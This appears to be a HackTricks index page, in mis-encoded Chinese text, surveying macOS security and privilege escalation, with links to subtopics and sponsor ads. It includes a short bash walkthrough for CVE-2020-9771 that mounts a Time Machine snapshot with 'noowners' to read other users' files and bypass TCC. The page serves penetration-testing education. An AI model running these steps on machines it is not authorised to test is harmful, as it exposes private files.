# macOSå®‰å…¨ä¸æƒé™æå‡

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´ç»è¿‡éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å´›èµ·ä¹‹æ—¶æŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶ç™»ä¸Šæ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register) ä»æ‚¨çš„é»‘å®¢è¡ŒåŠ¨ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## åŸºæœ¬çš„MacOS

å¦‚æœæ‚¨å¯¹macOSä¸ç†Ÿæ‚‰ï¼Œæ‚¨åº”è¯¥å¼€å§‹å­¦ä¹ macOSçš„åŸºç¡€çŸ¥è¯†ï¼š

* ç‰¹æ®Šçš„macOS**æ–‡ä»¶å’Œæƒé™ï¼š**

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* å¸¸è§çš„macOS**ç”¨æˆ·**

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* **AppleFS**

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* **å†…æ ¸**çš„**æ¶æ„**

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* å¸¸è§çš„macOS**ç½‘ç»œæœåŠ¡å’Œåè®®**

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

### MacOS MDM

åœ¨å…¬å¸ä¸­ï¼Œ**macOS**ç³»ç»Ÿå¾ˆå¯èƒ½ä¼šé€šè¿‡MDMè¿›è¡Œ**ç®¡ç†**ã€‚å› æ­¤ï¼Œä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œäº†è§£**å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„**æ˜¯å¾ˆæœ‰æ„ä¹‰çš„ï¼š

{% content-ref url="../macos-red-teaming/macos-mdm/" %}
[macos-mdm](../macos-red-teaming/macos-mdm/)
{% endcontent-ref %}

### MacOS - æ£€æŸ¥ã€è°ƒè¯•å’Œæ¨¡ç³Šæµ‹è¯•

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## MacOSå®‰å…¨ä¿æŠ¤

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## æ”»å‡»é¢

### æ–‡ä»¶æƒé™

å¦‚æœä»¥**rootèº«ä»½è¿è¡Œçš„è¿›ç¨‹**å†™å…¥ä¸€ä¸ªå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶çš„æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥**æå‡æƒé™**ã€‚\
è¿™ç§æƒ…å†µå¯èƒ½å‘ç”Ÿåœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼š

* ä½¿ç”¨çš„æ–‡ä»¶å·²ç»ç”±ç”¨æˆ·åˆ›å»ºï¼ˆç”±ç”¨æˆ·æ‹¥æœ‰ï¼‰
* ä½¿ç”¨çš„æ–‡ä»¶ç”±äºä¸€ä¸ªç»„çš„åŸå› å¯è¢«ç”¨æˆ·å†™å…¥
* ä½¿ç”¨çš„æ–‡ä»¶ä½äºç”¨æˆ·æ‹¥æœ‰çš„ç›®å½•ä¸­ï¼ˆç”¨æˆ·å¯ä»¥åˆ›å»ºæ–‡ä»¶ï¼‰
* ä½¿ç”¨çš„æ–‡ä»¶ä½äºç”±rootæ‹¥æœ‰ä½†ç”¨æˆ·å…·æœ‰å†™å…¥æƒé™çš„ç›®å½•ä¸­ï¼ˆç”¨æˆ·å¯ä»¥åˆ›å»ºæ–‡ä»¶ï¼‰

èƒ½å¤Ÿ**åˆ›å»ºä¸€ä¸ªå°†è¢«rootä½¿ç”¨çš„æ–‡ä»¶**ï¼Œå…è®¸ç”¨æˆ·**åˆ©ç”¨å…¶å†…å®¹**ï¼Œç”šè‡³åˆ›å»º**ç¬¦å·é“¾æ¥/ç¡¬é“¾æ¥**å°†å…¶æŒ‡å‘å¦ä¸€ä¸ªä½ç½®ã€‚

å¯¹äºè¿™ç§ç±»å‹çš„æ¼æ´ï¼Œä¸è¦å¿˜è®°**æ£€æŸ¥æ˜“å—æ”»å‡»çš„`.pkg`å®‰è£…ç¨‹åº**ï¼š

{% content-ref url="macos-files-folders-and-binaries/macos-installers-abuse.md" %}
[macos-installers-abuse.md](macos-files-folders-and-binaries/macos-installers-abuse.md)
{% endcontent-ref %}

### æƒé™æ»¥ç”¨å’Œç‰¹æƒæ»¥ç”¨é€šè¿‡è¿›ç¨‹æ»¥ç”¨

å¦‚æœä¸€ä¸ªè¿›ç¨‹å¯ä»¥**å‘å…·æœ‰æ›´é«˜ç‰¹æƒæˆ–æƒé™çš„å¦ä¸€ä¸ªè¿›ç¨‹æ³¨å…¥ä»£ç **æˆ–ä¸å…¶è”ç³»ä»¥æ‰§è¡Œç‰¹æƒæ“ä½œï¼Œå®ƒå¯ä»¥æå‡æƒé™å¹¶ç»•è¿‡é˜²å¾¡æªæ–½ï¼Œå¦‚[Sandbox](macos-security-protections/macos-sandbox/)æˆ–[TCC](macos-security-protections/macos-tcc/)ã€‚

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}
### æ–‡ä»¶æ‰©å±•åå’ŒURLæ–¹æ¡ˆåº”ç”¨ç¨‹åºå¤„ç†ç¨‹åº

é€šè¿‡æ–‡ä»¶æ‰©å±•åæ³¨å†Œçš„å¥‡æ€ªåº”ç”¨ç¨‹åºå¯èƒ½ä¼šè¢«æ»¥ç”¨ï¼Œå¹¶ä¸”å¯ä»¥æ³¨å†Œä¸åŒçš„åº”ç”¨ç¨‹åºæ¥æ‰“å¼€ç‰¹å®šçš„åè®®ã€‚

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

## MacOSæƒé™æå‡

### CVE-2020-9771 - mount\_apfs TCCç»•è¿‡å’Œæƒé™æå‡

**ä»»ä½•ç”¨æˆ·**ï¼ˆå³ä½¿æ˜¯éç‰¹æƒç”¨æˆ·ï¼‰éƒ½å¯ä»¥åˆ›å»ºå’ŒæŒ‚è½½æ—¶é—´æœºå™¨å¿«ç…§ï¼Œå¹¶**è®¿é—®è¯¥å¿«ç…§çš„æ‰€æœ‰æ–‡ä»¶**ã€‚\
å”¯ä¸€éœ€è¦çš„ç‰¹æƒæ˜¯æ‰€ä½¿ç”¨çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚`Terminal`ï¼‰å…·æœ‰**å®Œå…¨ç£ç›˜è®¿é—®æƒé™**ï¼ˆFDAï¼‰ï¼ˆ`kTCCServiceSystemPolicyAllfiles`ï¼‰ï¼Œéœ€è¦ç”±ç®¡ç†å‘˜æˆäºˆã€‚
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

æ›´è¯¦ç»†çš„è§£é‡Šå¯ä»¥åœ¨[**åŸå§‹æŠ¥å‘Šä¸­æ‰¾åˆ°**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**ã€‚**

### æ•æ„Ÿä¿¡æ¯

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linuxææƒ

é¦–å…ˆï¼Œè¯·æ³¨æ„**å¤§å¤šæ•°å…³äºç‰¹æƒæå‡çš„æŠ€å·§éƒ½ä¼šå½±å“MacOSæœºå™¨**ã€‚æ‰€ä»¥è¯·å‚è€ƒï¼š

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## MacOSé˜²å¾¡åº”ç”¨ç¨‹åº

## å‚è€ƒèµ„æ–™

* [**OS Xäº‹ä»¶å“åº”ï¼šè„šæœ¬å’Œåˆ†æ**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´ç»è¿‡éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¥å­é‡ŒæŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶å é¢†æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢è¡ŒåŠ¨ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
